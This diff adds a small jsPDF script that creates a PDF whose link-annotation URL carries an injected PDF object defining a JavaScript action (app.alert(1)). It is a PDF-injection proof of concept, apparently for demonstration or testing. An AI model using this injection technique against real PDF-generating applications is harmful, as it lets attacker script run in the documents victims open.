@@ -1,0 +1,7 @@
+var doc = new jsPDF();
+doc.text(20, 20, 'Hello world!');
+doc.addPage('a6','l');
+doc.createAnnotation({bounds:
+{x:0,y:10,w:200,h:200},type:'link',url:`
+/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(
+`});
